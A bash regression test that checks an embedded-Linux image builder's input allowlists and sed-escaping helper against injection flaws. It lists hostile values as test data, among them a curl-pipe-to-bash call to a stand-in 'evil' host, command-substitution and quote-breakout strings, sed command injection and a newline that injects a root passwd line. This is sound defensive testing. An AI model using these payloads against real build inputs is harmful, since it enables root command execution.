#!/usr/bin/env bash
# test-frite-builder-input-validation.sh — regression test for the FRITE builder's
# brand/identity/kernel/toolchain INPUT VALIDATION + sed-replacement ESCAPING
# (security findings #7 + #11 + #16 + #17 in build-frite-stage4.sh).
#
# build-frite-stage4.sh is a near-clone of build-rpi5-stage4.sh (same crossdev
# toolchain + shared mesh/provisioning specs) and carried the SAME injection sinks,
# but was NOT covered by the rpi5/x86 hardening PRs. This test asserts the frite
# builder's own copies of the fix.
#
# Background:
#   * #7  (HIGH): render_template() builds a `sed s|@@VAR@@|VALUE|g` program from
#     brand/domain/user/kernel vars with NO escaping. A value carrying the `|`
#     delimiter, the `&` match-reference, a backslash, or a newline could append a
#     second sed command (rewriting unrelated rendered content) or inject a new line
#     into make.conf / extlinux.conf / 01-firstboot.start — all of which are
#     sourced/executed as ROOT (the rendered first-boot script runs useradd/chpasswd
#     with DEFAULT_USER as root on the device).
#   * #11 (MED): RPI_CPU/CROSS_TARGET are interpolated into make.conf (CFLAGS=
#     -mcpu=@@RPI_CPU@@ / CHOST=@@CROSS_TARGET@@), which portage SOURCES as shell on
#     the (root) build host; a quote-breakout value runs $()/`` .
#   * #16 (MED): DEFAULT_USER flows through the same render sink into the first-boot
#     useradd/chpasswd (and media.conf shape) — covered by the username allowlist.
#   * #17 (MED): rebrand_sysroot() does `sed -i s|..|${BRAND_TITLE/ORG/CLUSTER_DOMAIN/
#     BRAND}|g` over the baked /etc/hugmesh tree with NO escaping.
#
# Fix asserted here (NO cross-build; runs anywhere with bash):
#   (1) The up-front charset allowlists ACCEPT every legitimate default and REJECT
#       injection payloads (verified by eval'ing the REAL validation slice extracted
#       from the builder — so the test tracks the actual code, no build is attempted).
#   (2) The REAL _sed_rep_escape helper (extracted from the builder) neutralizes the
#       sed delimiter `|`, the `&` metachar, and backslash, and REFUSES newlines, so a
#       tainted value used as an `s|||` replacement substitutes LITERALLY and cannot
#       inject a second sed command rewriting an unrelated token (covers render_template
#       #7/#11/#16 AND rebrand_sysroot #17, which share the helper).
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BUILDER="${REPO}/build-frite-stage4.sh"
[ -f "${BUILDER}" ] || { echo "  FAIL builder missing: ${BUILDER}"; exit 1; }

P=0; F=0
ok()  { echo "  PASS $*"; P=$((P+1)); }
bad() { echo "  FAIL $*"; F=$((F+1)); }

echo "== frite builder input-validation + sed-escape regression (#7, #11, #16, #17) =="

# ──────────────────────────────────────────────────────────────────────────────
# Part 1 — up-front charset allowlists (ACCEPT defaults, REJECT injection)
#
# Slice the REAL validation block: from the helper definition `_require_match()`
# through the last `_require_match "--target" ...` line. This is the exact code
# under test; if it is removed/renamed the slice is empty and the test FAILS.
# ──────────────────────────────────────────────────────────────────────────────
VALSLICE="$(awk '
    /^_require_match\(\) \{/ {grab=1}
    grab {print}
    /_require_match "--target"/ {exit}
' "${BUILDER}")"
[ -n "${VALSLICE}" ] || { echo "  FAIL could not slice the validation block from the builder"; exit 1; }
ok "sliced the REAL allowlist-validation block from the builder"

# The slice references err() (defined here) and the BRAND/ORG/... vars (set here).
err() { echo "ERROR: $1" >&2; }
# Defaults for every var the slice touches; the case under test overrides one.
_defaults() {
    BRAND="hugmesh"; ORG="hugmesh"
    CLUSTER_DOMAIN="hugmesh.systems"
    HOSTNAME="hugmesh-frite"; DEFAULT_USER="frite"
    BRAND_TITLE="HugMesh Systems"; RPI_CPU="cortex-a53"
    CROSS_TARGET="aarch64-unknown-linux-gnu"
}
# 0 if the validation block ACCEPTS the current var-set, 1 if it REJECTs (the
# slice's `exit 1` on a bad value is caught by running it in a subshell).
_runval() { ( eval "${VALSLICE}" ) >/dev/null 2>&1; }

accepts() {  # <label> <var> <value>
    _defaults; eval "$2=\$3"
    if _runval; then ok "ACCEPT $1 ($2='$3')"; else bad "rejected legit $1 ($2='$3')"; fi
}
rejects() {  # <label> <var> <value>
    _defaults; eval "$2=\$3"
    if _runval; then bad "ACCEPTED injection $1 ($2='$3')"; else ok "REJECT $1 ($2='$3')"; fi
}

# Legit defaults must all pass (the all-defaults set, plus a couple of variants).
_defaults
if _runval; then ok "ACCEPT all legitimate defaults"; else bad "legitimate defaults REJECTED"; fi
accepts "user snap"     DEFAULT_USER  "snap"
accepts "host generic"  HOSTNAME      "gentoo-frite"
accepts "cpu native"    RPI_CPU       "native"
accepts "domain prod"   CLUSTER_DOMAIN "hugmesh.example.org"
accepts "title custom"  BRAND_TITLE   "Acme Edge OS"

# Injection payloads from the findings must all be rejected, fail-closed.
rejects "#11 RPI_CPU shell-breakout"  RPI_CPU       'cortex-a53" ; echo $(id -un) ; CFLAGS="x'
rejects "#11 CROSS_TARGET breakout"   CROSS_TARGET  'a64"; reboot; #'
rejects "#16 DEFAULT_USER cmd-inject" DEFAULT_USER  'x; curl http://evil|bash #'
rejects "#16 DEFAULT_USER subshell"   DEFAULT_USER  'x$(touch /tmp/pwned)'
rejects "#16 DEFAULT_USER quote"      DEFAULT_USER  "x'"
rejects "#7 BRAND sed pipe-inject"    BRAND         'X|g;s|keepme|PWNED'
rejects "#7 BRAND ampersand"          BRAND         'a&b'
rejects "#7 BRAND backtick"           BRAND         'a`id`'
rejects "#17 BRAND_TITLE cmd-inject"  BRAND_TITLE   'foo"; cp /bin/bash /tmp/r; #'
rejects "#17 ORG traversal"           ORG           '../../etc'
rejects "#7 DOMAIN sed-inject"        CLUSTER_DOMAIN 'a|d s/.*/PAYLOAD/'
rejects "#7 DEFAULT_USER newline"     DEFAULT_USER  $'frite\nroot:x:0:0'

# ──────────────────────────────────────────────────────────────────────────────
# Part 2 — _sed_rep_escape neutralizes sed-replacement metacharacters (sink DiD).
# Shared by render_template (#7/#11/#16) AND rebrand_sysroot (#17).
# ──────────────────────────────────────────────────────────────────────────────
extract_fn() { awk "/^$1\(\) \{/{p=1} p{print} /^\}/{if(p){exit}}" "${BUILDER}"; }
eval "$(extract_fn _sed_rep_escape)"
type _sed_rep_escape >/dev/null 2>&1 && ok "extracted the REAL _sed_rep_escape helper" \
    || { echo "  FAIL could not extract _sed_rep_escape"; exit 1; }

# A value attempting to append a SECOND sed command (rewrite unrelated token SECRET).
inj='X|g;s|SECRET|LEAKED'
# Baseline: UNESCAPED substitution rewrites SECRET (the OLD vulnerable behaviour).
base="$(printf 'tok=@@TOK@@ secret=SECRET\n' | sed -e "s|@@TOK@@|${inj}|g" 2>&1)"
case "${base}" in
    *LEAKED*) ok "baseline: UNESCAPED value DOES inject (SECRET->LEAKED) — confirms the sink is dangerous" ;;
    *)        bad "baseline did not reproduce the unescaped injection" ;;
esac
# Fixed: escaped substitution leaves SECRET untouched (literal insertion only).
esc="$(_sed_rep_escape "${inj}")"
fixed="$(printf 'tok=@@TOK@@ secret=SECRET\n' | sed -e "s|@@TOK@@|${esc}|g" 2>&1)"
case "${fixed}" in
    *SECRET*) ok "render_template/rebrand sink: SECRET preserved — NO second-command injection" ;;
    *)        bad "_sed_rep_escape: SECRET was rewritten — escape failed" ;;
esac
# `&` (whole-match reference) must be literal, not re-expanded to the matched token.
ampout="$(printf 'X@@TOK@@\n' | sed -e "s|@@TOK@@|$(_sed_rep_escape 'a&b')|g")"
[ "${ampout}" = "Xa&b" ] && ok "_sed_rep_escape: '&' inserted literally (not re-expanded)" \
    || bad "_sed_rep_escape: '&' mishandled (got '${ampout}')"
# A newline must be REFUSED fail-closed (the helper err+exits in a subshell).
( _sed_rep_escape $'a\nb' ) >/dev/null 2>&1 && bad "_sed_rep_escape: accepted a newline" \
    || ok "_sed_rep_escape: REFUSES embedded newline (fail-closed)"

echo
echo "== frite input-validation regression: ${P} passed, ${F} failed =="
[ "${F}" -eq 0 ] || exit 1
